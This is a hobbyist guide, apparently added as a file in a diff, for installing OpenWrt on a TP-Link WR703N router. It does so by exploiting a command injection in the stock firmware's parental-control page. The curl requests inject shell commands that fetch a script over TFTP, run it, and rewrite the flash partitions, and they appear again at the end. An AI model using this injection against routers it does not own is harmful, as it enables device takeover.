@@ -1,0 +1,82 @@
+3.17.1 Build 140120 Rel.56593n
+WR703N v1 00000000
+
+Upgrade your new WR703N V1.7 to openwrt.
+
+WARNING: THIS CAN BRICK YOUR DEVICE. DO NOT RELY ON ANY OF THIS INFORMATION.
+These are just hints how I did it.
+
+If you have no experience with wr703n's. Just buy a MR3020.
+
+You'll need:
+* A FTP server (in my case 192.168.1.9, I advise to use the same IP or understand what the hell you're doing)
+* An unix or mac workstation with curl (can be the same box)
+* A general knowledge of unix commands.
+* An openwrt image. I make my own but stock 12.09 might work.
+ http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin
+* A binary busybox for mips static compiled.
+  http://www.busybox.net/downloads/binaries/1.16.1/busybox-mips
+
+The general idea:
+* Put a script on your tp-link wr703n
+* Put a better busybox on your tp-link wr703n
+* Trick the wr703n into executing some commands to run this script.
+The script:
+* get the first en second part of the image from tftp
+* flash the first part of the image (1024k) to the mtd partition named kernel
+* flash the rest of the image (2819k) to the mtd partition named rootfs
+* reboot the box with openwrt on it.
+
+First setup the tftp server and put the following files there:
+
+=== file aa cut from here ======
+cd /tmp
+tftp -gl i1 192.168.1.9
+tftp -gl i2 192.168.1.9
+tftp -gl busybox 192.168.1.9
+chmod 755 busybox 
+./busybox dd if=i1 of=/dev/mtdblock1 conv=fsync
+./busybox dd if=i2 of=/dev/mtdblock2 conv=fsync
+./busybox reboot -f
+echo blaaat
+=== /file aa cut to here =======
+Put the rest also there:
+* busybox
+* openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin
+
+Cut the openwrt image in 2 parts. (Yes these commands):
+  These commands can take a while since I had no interrest in calculating a better blocksize.
+dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i1 bs=1 count=1048576
+dd if=openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of=i2 bs=1 skip=1048576
+
+now there are 4 files in your TFTP directory: aa, busybox, i1, i2
+
+Now let's take a router and have it set to the factory settings.
+
+Run these commands on you're workstation.
+# !!DO NOT POWER OFF YOUR ROUTER, IT WILL BRICK (and you need 3.3V serial to revive it).!!
+# First it wants a password set, let's do that. (the password is admin42 after this).
+curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true' 'http://192.168.1.1/'
+# Secondly it wants to have parental control enabled (probably the once in a lifetime opportunity to use this).
+curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=' --referer 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm' 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1&parent_mac_addr=00-00-00-00-00-02&Page=1'
+# That being done, now all we need is to just simply exploit the router.
+# readable it does:
+# cd /tmp ; tftp -gl aa 192.168.1.9; sh aa
+# DO NOT POWER OFF YOUR ROUTER, IT WILL BRICK (and you need 3.3V serial to revive it).
+curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=' --referer 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&Page=1' 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01&lan_lists=888&url_comment=test&url_0=;cd%20/tmp;&url_1=;tftp%20-gl%20aa%20192.168.1.9;&url_2=;sh%20aa;&url_3=&url_4=&url_5=&url_6=&url_7=&scheds_lists=255&enable=1&Changed=1&SelIndex=0&Page=1&rule_mode=0&Save=%B1%A3+%B4%E6'
+# DO NOT POWER OFF YOUR ROUTER, IT WILL BRICK (and you need 3.3V serial to revive it).
+
+Just wait until it starts to blink, than openwrt is loading. Depending on your image you can reach it on it's mac address.
+
+If you have no experience with wr703n's. Just buy a MR3020.
+
+
+
+
+
+
+curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true' 'http://192.168.1.1/'
+
+curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=' --referer 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm' 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1&parent_mac_addr=00-00-00-00-00-02&Page=1'
+
+curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=' --referer 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&Page=1' 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01&lan_lists=888&url_comment=test&url_0=;cd%20/tmp;&url_1=;tftp%20-gl%20aa%20192.168.1.9;&url_2=;sh%20aa;&url_3=&url_4=&url_5=&url_6=&url_7=&scheds_lists=255&enable=1&Changed=1&SelIndex=0&Page=1&rule_mode=0&Save=%B1%A3+%B4%E6'
